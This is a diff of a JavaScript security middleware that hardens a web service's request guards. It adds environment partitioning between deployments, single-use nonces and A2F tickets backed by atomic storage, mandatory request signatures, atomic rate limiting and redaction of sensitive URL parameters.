-  for (const item of diracCentralEnvCsvV150('DIRAC_VERCEL2_ONLY_ACTIONS')) actions.add(item);
   return actions;
+}
+
+function diracCentralServer1RecoveryEnvPartitionGuardV190(action) {
+  const role = diracCentralEnvValueV150('DIRAC_CENTRAL_DEPLOYMENT_ROLE') || diracCentralEnvValueV150('DIRAC_DEPLOYMENT_ROLE');
+  const cleanAction = String(action || '').trim().toLowerCase();
+  const vercel2OnlyAction = diracCentralVercel2OnlyActionsV150().has(cleanAction);
+  const server2OnlyEnv = [
+    'DIRAC_CENTRAL_VERCEL2_ACTIONS_ENABLED',
+    'DIRAC_VERCEL2_ACTIONS_ENABLED',
+    'DIRAC_CENTRAL_VERCEL2_ONLY_ACTIONS',
+    'DIRAC_VERCEL2_ONLY_ACTIONS',
+    'DIRAC_RECOVERY_WORKER_ALLOWED_CALLER',
+    'DIRAC_RECOVERY_WORKER_MAX_BODY_BYTES',
+    'DIRAC_RECOVERY_WORKER_CLOCK_SKEW_SECONDS',
+    'DIRAC_RECOVERY_WORKER_X25519_PRIVATE_KEY',
+    'DIRAC_RECOVERY_WORKER_MLKEM1024_PRIVATE_KEY',
+    'DIRAC_LOST_PASSKEY_ARGON2_MEMORY_KIB',
+    'DIRAC_LOST_PASSKEY_ARGON2_TIME_COST',
+    'DIRAC_LOST_PASSKEY_ARGON2_PARALLELISM',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_MEMORY_KIB',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_TIME_COST',
+    'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_PARALLELISM',
+    'DIRAC_LOST_PASSKEY_ROOT_SECRET',
+    'DIRAC_LOST_PASSKEY_ROOT_SECRET_VERSION',
+    'DIRAC_LOST_PASSKEY_DB_PEPPER',
+    'DIRAC_LOST_PASSKEY_MAX_RUNNING',
+    'DIRAC_LOST_PASSKEY_QUEUE_MAX',
+    'DIRAC_LOST_PASSKEY_PROCESSING_LOCK_TTL_SECONDS',
+    'DIRAC_RECOVERY_SERVER1_URL',
+    'DIRAC_RECOVERY_HPKE_PRIVATE_KEY',
+    'DIRAC_RECOVERY_HPKE_KEY_ID',
+    'DIRAC_RECOVERY_HPKE_PEPPER',
+    'DIRAC_RECOVERY_HPKE_PEPPER_KEY_ID',
+    'DIRAC_RECOVERY_HPKE_ARGON2_MEMORY_KIB',
+    'DIRAC_RECOVERY_HPKE_ARGON2_TIME_COST',
+    'DIRAC_LOST_PASSKEY_ED25519_PRIVATE_KEY',
+    'DIRAC_LOST_PASSKEY_ED25519_PRIVATE_KEY_PEM',
+    'DIRAC_RECOVERY_MLKEM1024_PRIVATE_KEY_PEM',
+    'DIRAC_RECOVERY_MLKEM1024_PRIVATE_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLDSA87_PRIVATE_KEY_PEM',
+    'DIRAC_RECOVERY_MLDSA87_PRIVATE_KEY_DER_B64',
+    'DIRAC_LOST_PASSKEY_ED25519_PUBLIC_KEY_PEM',
+    'DIRAC_LOST_PASSKEY_ED25519_PUBLIC_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLKEM1024_PUBLIC_KEY_PEM',
+    'DIRAC_RECOVERY_MLKEM1024_PUBLIC_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLKEM1024_KEY_ID',
+    'DIRAC_RECOVERY_MLDSA87_PUBLIC_KEY_PEM',
+    'DIRAC_RECOVERY_MLDSA87_PUBLIC_KEY_DER_B64',
+    'DIRAC_RECOVERY_MLDSA87_KEY_ID',
+    'DIRAC_RECOVERY_FIPS_RUNTIME_REQUIRED',
+    'DIRAC_LOST_PASSKEY_QUEUE_DISABLED',
+    'DIRAC_LOST_PASSKEY_QUEUE_LOCK_TTL_SECONDS',
+    'DIRAC_LOST_PASSKEY_QUEUE_MAX_WAIT_SECONDS',
+    'DIRAC_LOST_PASSKEY_QUEUE_POLL_MS'
+  ];
+  const present = (name) => Boolean(String(process.env[name] || '').trim());
+
+  if (role === 'vercel2') {
+    return vercel2OnlyAction
+      ? { ok: true }
+      : { ok: false, reason: 'vercel2_non_worker_action_forbidden' };
+  }
+
+  if (role !== 'vercel1') return { ok: false, reason: 'vercel1_deployment_role_required' };
+  if (server2OnlyEnv.some(present)) return { ok: false, reason: 'vercel2_env_present_on_vercel1' };
+  if (vercel2OnlyAction) return { ok: false, reason: 'vercel2_action_forbidden_on_vercel1' };
+  return { ok: true };
 }
 
 function diracCentralEnvCsvV150(name) {
@@ -26195,43 +34447,32 @@ function diracCentralEnvTrueV150(name) {
   return /^(1|true|yes|on|enabled|enable)$/i.test(String(process.env[name] || '').trim());
 }
 
-function diracCentralStampV146(ctx, name) {
+function diracCentralStampV146(ctx, name, decision = 'passed') {
   if (!ctx) return;
+  const cleanName = String(name || '');
+  const cleanDecision = String(decision || 'passed');
   if (!ctx.guardPassport || typeof ctx.guardPassport !== 'object') ctx.guardPassport = Object.create(null);
-  ctx.guardPassport[String(name || '')] = true;
+  if (!ctx.guardDecisions || typeof ctx.guardDecisions !== 'object') ctx.guardDecisions = Object.create(null);
+  if (!Array.isArray(ctx.audit)) ctx.audit = [];
+  ctx.guardPassport[cleanName] = true;
+  ctx.guardDecisions[cleanName] = cleanDecision;
+  const bit = DIRAC_V202_CHECKPOINT_BY_STAMP[cleanName];
+  if (typeof bit === 'bigint') ctx.passport = BigInt(ctx.passport || 0n) | bit;
+  ctx.audit.push(Object.freeze({ checkpoint: cleanName, decision: cleanDecision }));
 }
 
 function diracCentralIntegrityVerifierV146(ctx) {
-  const pass = ctx && ctx.guardPassport || {};
-  const required = [
-    'identity_checked',
-    'memory_ban_checked',
-    'persistent_ban_checked',
-    'action_format_checked',
-    'alias_checked',
-    'whitelist_checked',
-    'classification_checked',
-    'rate_checked',
-    'body_checked',
-    'light_checked',
-    'contract_checked',
-    'idor_checked',
-    'circuit_checked',
-    'mfa_checked',
-    'vercel2_action_checked'
-  ];
-  if (ctx && ctx.classification === 'server') required.push('server_guard_checked');
-  if (ctx && ctx.classification === 'public_read') required.push('public_read_checked', 'sample_checked', 'threat_checked', 'zeroday_checked');
-  if (ctx && (ctx.classification === 'browser' || ctx.classification === 'admin' || DIRAC_CENTRAL_SENSITIVE_ACTIONS_V146.has(ctx.action))) {
-    required.push('browser_auth_checked', 'csrf_checked', 'page_nonce_checked', 'browser_signal_checked', 'device_checked');
-  }
-  if (ctx && ctx.isA2FAction) required.push('a2f_signature_checked');
-  if (ctx && ctx.classification === 'admin') required.push('admin_checked');
-  if (ctx && !ctx.skipHeavyScan && ctx.classification !== 'server' && ctx.classification !== 'public_read') {
-    required.push('sample_checked', 'threat_checked', 'zeroday_checked');
-  }
-  for (const stamp of required) {
-    if (!pass[stamp]) return { ok: false, reason: 'central_guard_integrity_missing_' + stamp };
+  if (!ctx) return { ok: false, reason: 'central_guard_integrity_context_missing' };
+  const actual = BigInt(ctx.passport || 0n);
+  const required = BigInt(ctx.requiredPassport || DIRAC_V202_PRE_INTEGRITY_CHECKPOINTS);
+  if ((actual & required) !== required) {
+    for (const [stamp, bit] of Object.entries(DIRAC_V202_CHECKPOINT_BY_STAMP)) {
+      if (bit === CHECKPOINT.INTEGRITY) continue;
+      if ((required & bit) === bit && (actual & bit) !== bit) {
+        return { ok: false, reason: 'central_guard_integrity_missing_' + stamp };
+      }
+    }
+    return { ok: false, reason: 'central_guard_integrity_bitmask_incomplete' };
   }
   return { ok: true };
 }
@@ -26326,7 +34567,7 @@ function diracCentralCsrfGuardV146(req, res, ctx) {
   try { diracCentralRootSecretV146(); } catch (_) { return { ok: false, reason: 'csrf_root_secret_invalid' }; }
   if (!diracCentralNeedsCsrfNonceV146(ctx)) {
     if ((ctx.method === 'GET' || ctx.method === 'HEAD') && typeof diracCsrfIssueToken === 'function') {
-      try { diracCsrfIssueToken(req, res, ctx.action); } catch (_) {}
+      try { diracCsrfIssueToken(req, res, ctx.action); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
     }
     return { ok: true };
   }
@@ -26348,7 +34589,7 @@ function diracCentralNeedsCsrfNonceV146(ctx) {
   return ctx.classification === 'browser' || ctx.classification === 'admin' || DIRAC_CENTRAL_SENSITIVE_ACTIONS_V146.has(ctx.action);
 }
 
-function diracCentralPageNonceGuardV146(req, res, ctx) {
+async function diracCentralPageNonceGuardV146(req, res, ctx) {
   try { diracCentralRootSecretV146(); } catch (_) { return { ok: false, reason: 'page_nonce_root_secret_invalid' }; }
   if ((ctx.method === 'GET' || ctx.method === 'HEAD') && ctx.classification !== 'server') {
     diracCentralIssuePageNonceV146(req, res, diracCentralPageNonceIssueTargetV146(req, ctx));
@@ -26359,7 +34600,10 @@ function diracCentralPageNonceGuardV146(req, res, ctx) {
   if (!nonce) return { ok: false, reason: 'page_nonce_missing' };
   const verified = diracCentralVerifyPageNonceV146(req, nonce, ctx.action);
   if (!verified.ok) return { ok: false, reason: verified.reason || 'page_nonce_invalid' };
-  return { ok: true };
+  ctx.__diracPageNonceProofV228 = Object.freeze({ token: nonce, payload: Object.freeze({ ...verified.payload }) });
+  if (ctx.isA2FAction) return { ok: true, source: 'page_nonce_verified_pending_a2f_consume' };
+  const consumed = await diracCentralConsumePageNonceV228(verified.payload);
+  return consumed.ok ? { ok: true, source: 'single_use_page_nonce_v228' } : consumed;
 }
 
 function diracCentralIsPasskeyBrowserActionV146(ctx) {
@@ -26408,17 +34652,28 @@ function diracCentralIssuePageNonceV146(req, res, action) {
   const secret = diracCentralSecretV146();
   const now = Math.floor(Date.now() / 1000);
   const payload = {
-    typ: 'dirac-page-nonce-v1',
+    typ: diracCentralIsA2FActionV148(action) ? 'dirac-a2f-action-ticket-v230' : 'dirac-page-nonce-v1',
     iat: now,
     exp: now + 300,
+    jti: crypto.randomBytes(24).toString('base64url'),
     act: String(action || ''),
+    mth: (() => {
+      const contract = diracCentralContractForActionV146(String(action || ''));
+      if (contract && Array.isArray(contract.methods)) {
+        if (contract.methods.includes('POST')) return 'POST';
+        if (contract.methods.includes('GET')) return 'GET';
+        if (contract.methods.includes('HEAD')) return 'HEAD';
+      }
+      return 'POST';
+    })(),
     sid: diracCentralRequestSessionHashV146(req),
     oh: diracCentralHashV146(diracCentralNormalizeOriginV146(req && req.headers && (req.headers.origin || req.headers.referer || req.headers.referrer) || ''))
   };
   const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
   const sig = crypto.createHmac('sha256', secret).update(body).digest('base64url');
   const token = body + '.' + sig;
-  try { res.setHeader('X-Dirac-Page-Nonce', token); } catch (_) {}
+  try { res.setHeader('X-Dirac-Page-Nonce', token); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  if (diracCentralIsA2FActionV148(action)) diracCentralIssueA2FRequestProofV230(req, res, action);
   return token;
 }
 
@@ -26432,14 +34687,19 @@ function diracCentralVerifyPageNonceV146(req, token, action) {
   let payload = null;
   try { payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8')); } catch (_) { return { ok: false, reason: 'page_nonce_payload_invalid' }; }
   const now = Math.floor(Date.now() / 1000);
-  if (!payload || payload.typ !== 'dirac-page-nonce-v1') return { ok: false, reason: 'page_nonce_type_invalid' };
-  if (!payload.exp || Number(payload.exp) < now) return { ok: false, reason: 'page_nonce_expired' };
+  const expectedType = diracCentralIsA2FActionV148(action) ? 'dirac-a2f-action-ticket-v230' : 'dirac-page-nonce-v1';
+  if (!payload || payload.typ !== expectedType) return { ok: false, reason: 'page_nonce_type_invalid' };
+  if (!Number.isSafeInteger(Number(payload.iat)) || !Number.isSafeInteger(Number(payload.exp))) return { ok: false, reason: 'page_nonce_time_invalid' };
+  if (Number(payload.iat) > now + 30 || Number(payload.iat) < now - 600 || Number(payload.exp) <= now || Number(payload.exp) > Number(payload.iat) + 600) return { ok: false, reason: 'page_nonce_expired_or_time_invalid' };
+  if (!/^[A-Za-z0-9_-]{32}$/.test(String(payload.jti || ''))) return { ok: false, reason: 'page_nonce_jti_invalid' };
   if (String(payload.act || '') !== String(action || '')) return { ok: false, reason: 'page_nonce_action_mismatch' };
+  const requestMethod = String(req && req.method || '').toUpperCase();
+  if (!payload.mth || String(payload.mth).toUpperCase() !== requestMethod) return { ok: false, reason: 'page_nonce_method_mismatch' };
   const sid = diracCentralRequestSessionHashV146(req);
   if (payload.sid && sid && payload.sid !== sid) return { ok: false, reason: 'page_nonce_session_mismatch' };
   const originHash = diracCentralHashV146(diracCentralNormalizeOriginV146(req && req.headers && (req.headers.origin || req.headers.referer || req.headers.referrer) || ''));
   if (payload.oh && originHash && payload.oh !== originHash) return { ok: false, reason: 'page_nonce_origin_mismatch' };
-  return { ok: true };
+  return { ok: true, payload };
 }
 
 function diracCentralIsA2FActionV148(action) {
@@ -26455,6 +34715,10 @@ function diracCentralStableJsonV148(value) {
 
 function diracCentralA2FBodyHashV148(ctx) {
   try {
+    const override = String(ctx && ctx.__diracA2FBodyHashV230 || '').trim().toLowerCase();
+    if (/^[a-f0-9]{64}$/.test(override)) return override;
+    const rawHash = String(ctx && ctx.req && ctx.req.__diracRawBodySha256V230 || '').trim().toLowerCase();
+    if (/^[a-f0-9]{64}$/.test(rawHash)) return rawHash;
     const body = ctx && ctx.body && typeof ctx.body === 'object' ? ctx.body : {};
     return crypto.createHash('sha256').update(diracCentralStableJsonV148(body)).digest('hex');
   } catch (_) {
@@ -26486,6 +34750,37 @@ function diracCentralSignA2FPayloadV148(payload) {
   return body + '.' + sig;
 }
 
+
+function diracCentralIssueA2FRequestProofV230(req, res, action) {
+  if (!res || typeof res.setHeader !== 'function' || !diracCentralIsA2FActionV148(action)) return { ok: false, reason: 'a2f_issuer_not_applicable' };
+  const query = req && req.query && typeof req.query === 'object' ? req.query : {};
+  const bodyHash = String(query._dirac_a2f_body_hash || '').trim().toLowerCase();
+  if (!/^[a-f0-9]{64}$/.test(bodyHash)) return { ok: false, reason: 'a2f_body_hash_required' };
+  const contract = diracCentralContractForActionV146(String(action || ''));
+  const method = contract && Array.isArray(contract.methods) && contract.methods.includes('POST') ? 'POST' : '';
+  if (!method) return { ok: false, reason: 'a2f_action_method_invalid' };
+  const now = Math.floor(Date.now() / 1000);
+  const payload = diracCentralA2FSignaturePayloadV148(req, {
+    action: String(action || ''),
+    method,
+    __diracA2FBodyHashV230: bodyHash
+  }, {
+    iat: now,
+    exp: now + 120,
+    jti: crypto.randomBytes(24).toString('base64url')
+  });
+  const ticket = diracCentralSignA2FPayloadV148(payload);
+  const signature = ticket.split('.')[1] || '';
+  if (!signature) return { ok: false, reason: 'a2f_issuer_signature_failed' };
+  try {
+    res.setHeader('X-Dirac-A2F-Ticket', ticket);
+    res.setHeader('X-Dirac-A2F-Signature', signature);
+  } catch (_) {
+    return { ok: false, reason: 'a2f_issuer_header_failed' };
+  }
+  return { ok: true, ticket, signature, payload };
+}
+
 function diracCentralDecodeA2FTicketV148(ticket) {
   const parts = String(ticket || '').trim().split('.');
   if (parts.length !== 2 || !parts[0] || !parts[1]) return null;
@@ -26500,45 +34795,83 @@ function diracCentralDecodeA2FTicketV148(ticket) {
   }
 }
 
-function diracCentralConsumeA2FNonceV148(jti, exp) {
-  const clean = String(jti || '').trim();
+async function diracCentralAtomicConsumeV230({ namespace, jti, expiresAt, contextHash }) {
+  const cleanNamespace = String(namespace || '').trim().toLowerCase();
+  const cleanJti = String(jti || '').trim();
   const now = Math.floor(Date.now() / 1000);
-  if (!clean || !/^[a-zA-Z0-9_-]{16,160}$/.test(clean)) return { ok: false, reason: 'a2f_signature_nonce_invalid' };
-  for (const [key, until] of DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.entries()) {
-    if (Number(until || 0) <= now) DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.delete(key);
+  const exp = Number(expiresAt || 0);
+  if (!/^[a-z0-9_-]{3,60}$/.test(cleanNamespace) || !/^[A-Za-z0-9_-]{16,160}$/.test(cleanJti)) {
+    return { ok: false, reason: cleanNamespace + '_nonce_invalid' };
   }
-  if (DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.has(clean)) return { ok: false, reason: 'a2f_signature_replay' };
-  DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.set(clean, Math.max(now + 60, Number(exp || 0)));
-  if (DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.size > 5000) {
-    for (const key of DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.keys()) {
-      DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.delete(key);
-      if (DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148.size <= 3000) break;
+  if (!Number.isSafeInteger(exp) || exp <= now || exp > now + 15 * 60) return { ok: false, reason: cleanNamespace + '_nonce_expiry_invalid' };
+  const securityKey = 's2s-central-atomic-v230:' + diracCentralHashV146([cleanNamespace, cleanJti, String(contextHash || '')].join('|'));
+  const result = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_consume_v230', {
+    method: 'POST',
+    auth: 'service',
+    body: {
+      p_security_key: securityKey,
+      p_record_json: {
+        type: 'dirac_central_atomic_consume_v230',
+        namespace: cleanNamespace,
+        nonce_hash: diracCentralHashV146(cleanJti),
+        context_hash: diracCentralHashV146(String(contextHash || '')),
+        consumed_at_ms: Date.now(),
+        expires_at_s: exp
+      },
+      p_expires_at: new Date(exp * 1000).toISOString()
     }
-  }
+  }).catch(() => null);
+  if (!result || result.ok !== true || result.data !== true) return { ok: false, reason: cleanNamespace + '_replay_or_atomic_storage_unavailable' };
   return { ok: true };
 }
 
-function diracCentralA2FRequestSignatureGuardV148(req, ctx) {
+async function diracCentralClaimSingleUseNonceV228(scope, jti, exp, binding) {
+  return diracCentralAtomicConsumeV230({
+    namespace: scope,
+    jti,
+    expiresAt: Number(exp || 0),
+    contextHash: String(binding || '')
+  });
+}
+
+async function diracCentralConsumePageNonceV228(payload) {
+  const source = payload && typeof payload === 'object' ? payload : {};
+  return diracCentralClaimSingleUseNonceV228('page_nonce', source.jti, Number(source.exp || 0), [source.act, source.sid, source.oh, source.mth].join('|'));
+}
+
+async function diracCentralConsumeA2FNonceV148(jti, exp, binding) {
+  return diracCentralClaimSingleUseNonceV228('a2f_signature', jti, exp, binding);
+}
+
+async function diracCentralA2FRequestSignatureGuardV148(req, ctx) {
   if (!ctx || !ctx.isA2FAction) return { ok: true, source: 'not_a2f' };
   try { diracCentralRootSecretV146(); } catch (_) { return { ok: false, reason: 'a2f_signature_root_secret_invalid' }; }
   const headers = req && req.headers || {};
   const ticket = String(headers['x-dirac-a2f-ticket'] || headers['x-dirac-a2f-signature-ticket'] || '').trim();
   const signature = String(headers['x-dirac-a2f-signature'] || '').trim();
+  const pageProof = ctx.__diracPageNonceProofV228 && ctx.__diracPageNonceProofV228.payload
+    ? ctx.__diracPageNonceProofV228.payload
+    : null;
 
-  if (!ticket && !signature) {
-    if (diracCentralA2FExplicitSignatureRequiredV148()) return { ok: false, reason: 'a2f_signature_missing' };
-    const pageNonce = String(headers['x-dirac-page-nonce'] || headers['x-page-nonce'] || '').trim();
-    const pageNonceOk = pageNonce ? diracCentralVerifyPageNonceV146(req, pageNonce, ctx.action) : { ok: false };
-    return pageNonceOk.ok ? { ok: true, source: 'signed_page_nonce_compat' } : { ok: false, reason: 'a2f_signed_nonce_missing' };
-  }
+  if (!ticket && !signature) return { ok: false, reason: 'a2f_signature_required' };
   if (!ticket || !signature) return { ok: false, reason: 'a2f_signature_incomplete' };
 
   const ticketPayload = diracCentralDecodeA2FTicketV148(ticket);
   if (!ticketPayload) return { ok: false, reason: 'a2f_ticket_signature_invalid' };
   const now = Math.floor(Date.now() / 1000);
   if (ticketPayload.typ !== 'dirac-a2f-request-signature-v148') return { ok: false, reason: 'a2f_ticket_type_invalid' };
-  if (!ticketPayload.exp || Number(ticketPayload.exp) < now) return { ok: false, reason: 'a2f_ticket_expired' };
-  if (ticketPayload.iat && Number(ticketPayload.iat) > now + 60) return { ok: false, reason: 'a2f_ticket_iat_invalid' };
+  const issuedAt = Number(ticketPayload.iat || 0);
+  const expiresAt = Number(ticketPayload.exp || 0);
+  if (!Number.isSafeInteger(issuedAt) || !Number.isSafeInteger(expiresAt)
+      || issuedAt > now + 30 || issuedAt < now - 180 || expiresAt <= now || expiresAt > issuedAt + 120) {
+    return { ok: false, reason: 'a2f_ticket_time_invalid' };
+  }
+  if (!/^[A-Za-z0-9_-]{32}$/.test(String(ticketPayload.jti || ''))) return { ok: false, reason: 'a2f_ticket_jti_invalid' };
+  const actualBodyHash = diracCentralA2FBodyHashV148(ctx);
+  if (!/^[a-f0-9]{64}$/.test(String(ticketPayload.bh || ''))
+      || !(typeof safeEqual === 'function' ? safeEqual(String(ticketPayload.bh), actualBodyHash) : String(ticketPayload.bh) === actualBodyHash)) {
+    return { ok: false, reason: 'a2f_ticket_body_hash_mismatch' };
+  }
 
   const expectedPayload = diracCentralA2FSignaturePayloadV148(req, ctx, ticketPayload);
   const expectedSignature = diracCentralSignA2FPayloadV148(expectedPayload).split('.')[1];
@@ -26546,17 +34879,17 @@ function diracCentralA2FRequestSignatureGuardV148(req, ctx) {
     if (!safeEqual(expectedSignature, signature)) return { ok: false, reason: 'a2f_signature_invalid' };
   } else if (expectedSignature !== signature) return { ok: false, reason: 'a2f_signature_invalid' };
 
-  const nonce = diracCentralConsumeA2FNonceV148(expectedPayload.jti, expectedPayload.exp);
+  const nonce = await diracCentralConsumeA2FNonceV148(expectedPayload.jti, expectedPayload.exp, diracCentralStableJsonV148(expectedPayload));
   if (!nonce.ok) return nonce;
-  return { ok: true, source: 'a2f_request_signature_v148' };
+  if (pageProof) {
+    const pageConsumed = await diracCentralConsumePageNonceV228(pageProof);
+    if (!pageConsumed.ok) return { ok: false, reason: pageConsumed.reason || 'page_nonce_replay' };
+  }
+  return { ok: true, source: 'a2f_request_signature_single_use_v228' };
 }
 
 function diracCentralA2FExplicitSignatureRequiredV148() {
-  try {
-    return isEnvTrue('DIRAC_A2F_REQUEST_SIGNATURE_ENFORCE') || isEnvTrue('DIRAC_A2F_SIGNATURE_ENFORCE');
-  } catch (_) {
-    return false;
-  }
+  return true;
 }
 
 function diracCentralBrowserSignalGuardV146(req, ctx) {
@@ -26645,11 +34978,11 @@ async function diracCentralAdminAuthGuardV146(req, res, ctx) {
       if (!admin) return { ok: false, reason: 'admin_auth_invalid' };
       return { ok: true };
     }
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return { ok: false, reason: 'admin_guard_missing' };
 }
 
-function diracCentralPublicReadGuardV146(req, ctx) {
+async function diracCentralPublicReadGuardV146(req, ctx) {
   if (ctx.classification !== 'public_read') return { ok: true };
   const headers = req && req.headers || {};
   const origin = diracCentralNormalizeOriginV146(headers.origin || '');
@@ -26668,6 +35001,8 @@ function diracCentralPublicReadGuardV146(req, ctx) {
     if (!nonce) return { ok: false, reason: 'public_nonce_missing' };
     const verified = diracCentralVerifyPageNonceV146(req, nonce, ctx.action);
     if (!verified.ok) return { ok: false, reason: verified.reason || 'public_nonce_invalid' };
+    const consumed = await diracCentralConsumePageNonceV228(verified.payload);
+    if (!consumed.ok) return { ok: false, reason: consumed.reason || 'public_nonce_replay' };
     if (typeof diracV138CsrfForceVerify === 'function') {
       const csrf = diracV138CsrfForceVerify(req, ctx.action);
       if (!csrf || !csrf.ok) return { ok: false, reason: csrf && csrf.code || 'public_csrf_invalid' };
@@ -26680,33 +35015,55 @@ function diracCentralPublicReadGuardV146(req, ctx) {
   return { ok: true };
 }
 
+async function diracCentralAtomicRateLimitV230({ key, limit, windowSeconds, blockSeconds }) {
+  const cleanKey = String(key || '').trim();
+  const max = Math.max(1, Math.min(10000, Number(limit || 1)));
+  const window = Math.max(1, Math.min(86400, Number(windowSeconds || 60)));
+  const block = Math.max(0, Math.min(86400, Number(blockSeconds || 0)));
+  if (!cleanKey || cleanKey.length > 500) return { ok: false, reason: 'atomic_rate_key_invalid' };
+  const result = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_rate_limit_v230', {
+    method: 'POST',
+    auth: 'service',
+    body: { p_security_key: cleanKey, p_limit: max, p_window_seconds: window, p_block_seconds: block }
+  }).catch(() => null);
+  const row = result && result.ok === true && Array.isArray(result.data) ? result.data[0] : null;
+  if (!row || typeof row.allowed !== 'boolean' || !Number.isFinite(Number(row.current_count))) {
+    return { ok: false, reason: 'distributed_rate_limit_atomic_storage_unavailable' };
+  }
+  return {
+    ok: row.allowed === true,
+    count: Number(row.current_count),
+    resetAt: Date.parse(String(row.reset_at || '')) || 0,
+    blockedUntil: Date.parse(String(row.blocked_until || '')) || 0,
+    reason: row.allowed === true ? '' : 'distributed_rate_limit'
+  };
+}
+
+async function diracCentralAtomicRateSlotV228(ctx, action, windowMs, max) {
+  return diracCentralAtomicRateLimitV230({
+    key: 's2s-central-rate-v230:' + diracCentralHashV146([ctx.identity.key, action].join('|')),
+    limit: max,
+    windowSeconds: Math.ceil(Number(windowMs || 60000) / 1000),
+    blockSeconds: Math.ceil(Number(windowMs || 60000) / 1000)
+  });
+}
+
 async function diracCentralDistributedRateLimitGuardV146(req, ctx) {
   const action = String(ctx && ctx.action || '');
   const method = String(ctx && ctx.method || '').toUpperCase();
   if (method === 'OPTIONS') return { ok: true };
-  if (!diracCentralNeedsDistributedRateLimitV146(action)) return { ok: true };
-  const local = diracCentralRateLimitV146(ctx.identity.key + ':distributed-local:' + action, 60 * 1000, diracCentralDistributedRateLimitMaxV146(action));
-  if (!local.ok) return { ok: false, reason: 'distributed_rate_limit_local' };
-  const persistReady = Boolean(LOGIN_SECURITY_PERSIST_TABLE && typeof readPersistentSecurityJson === 'function' && typeof writePersistentSecurityJson === 'function');
-  if (!persistReady) {
-    return diracCentralIsProductionV146() ? { ok: false, reason: 'distributed_rate_limit_storage_required' } : { ok: true };
-  }
-  const windowMs = 60 * 1000;
+  if (!action || !diracCentralNeedsDistributedRateLimitV146(action)) return { ok: false, reason: 'distributed_rate_limit_action_policy_missing' };
   const max = diracCentralDistributedRateLimitMaxV146(action);
-  const now = Date.now();
-  const key = 'central-rate:' + diracCentralHashV146([ctx.identity.key, action, Math.floor(now / windowMs)].join('|'));
-  let row = await readPersistentSecurityJson(key).catch(() => null);
-  row = row && typeof row === 'object' ? row : { count: 0, resetAtMs: now + windowMs };
-  if (Number(row.resetAtMs || 0) <= now) row = { count: 0, resetAtMs: now + windowMs };
-  row.count = Number(row.count || 0) + 1;
-  const wrote = await writePersistentSecurityJson(key, row, 0, Math.ceil(windowMs / 1000) + 60).catch(() => false);
-  if (!wrote && diracCentralIsProductionV146()) return { ok: false, reason: 'distributed_rate_limit_write_failed' };
-  if (row.count > max) return { ok: false, reason: 'distributed_rate_limit' };
-  return { ok: true };
+  const local = diracCentralRateLimitV146(ctx.identity.key + ':distributed-local:' + action, 60 * 1000, max);
+  if (!local.ok) return { ok: false, reason: 'distributed_rate_limit_local' };
+  const persistReady = Boolean(DIRAC_S2S_SECURITY_TABLE === 'dirac_s2s_security' && typeof claimPersistentSecurityKeyOnceV194 === 'function');
+  if (!persistReady) return { ok: false, reason: 'distributed_rate_limit_atomic_storage_required' };
+  return diracCentralAtomicRateSlotV228(ctx, action, 60 * 1000, max);
 }
 
 function diracCentralNeedsDistributedRateLimitV146(action) {
-  return /^(domain_login|domain_register|domain_check|hostinger_check|checkout_order|domain_checkout|create_payment|customer_security_recovery_codes_generate|customer_security_recovery_code_verify|dirac_mfa_passkey_start|dirac_mfa_passkey_verify|domain_mfa_passkey_start|domain_mfa_passkey_verify)$/.test(String(action || ''));
+  const clean = String(action || '').trim();
+  return Boolean(clean && (DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(clean) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(clean)));
 }
 
 function diracCentralDistributedRateLimitMaxV146(action) {
@@ -26807,7 +35164,7 @@ function diracCentralSampleCollectorV146(req, ctx) {
   };
   push('action', ctx.action);
   push('method', ctx.method);
-  push('url', req && req.url);
+  push('url', diracCentralRedactSensitiveUrlV194(req && req.url));
   const headers = req && req.headers || {};
   ['origin', 'referer', 'referrer', 'user-agent', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'content-type', 'accept', 'accept-language'].forEach((key) => push(key, headers[key]));
   Object.entries(req && req.query || {}).slice(0, 80).forEach(([key, value]) => push('query.' + key, Array.isArray(value) ? value.join(',') : value));
@@ -26815,6 +35172,16 @@ function diracCentralSampleCollectorV146(req, ctx) {
   if (out.join('\n').length > 10 * 1024) return { ok: false, reason: 'sample_total_too_large' };
   ctx.sample = out.join('\n');
   return { ok: true };
+}
+
+function diracCentralRedactSensitiveUrlV194(value) {
+  const raw = String(value || '').slice(0, 4096);
+  return raw.replace(/([?&])([^=&#]{1,160})=([^&#]*)/g, (match, separator, encodedKey) => {
+    let key = encodedKey;
+    try { key = decodeURIComponent(encodedKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    if (!diracCentralSensitiveKeyV146(key)) return match;
+    return separator + encodedKey + '=[redacted]';
+  });
 }
 
 function diracCentralNormalizeSampleV146(sample) {
@@ -26864,9 +35231,71 @@ function diracCentralMassAssignmentThreatV146(ctx) {
   return forbidden ? { detected: true, kind: 'mass_assignment_' + forbidden } : { detected: false };
 }
 
+function diracCentralCheckoutOrderFieldWidthV191(ctx, flat) {
+  if (!ctx || ctx.action !== 'checkout_order' || ctx.method !== 'POST') {
+    return { ok: true, width: Array.isArray(flat) ? flat.length : 0 };
+  }
+
+  const body = ctx.body;
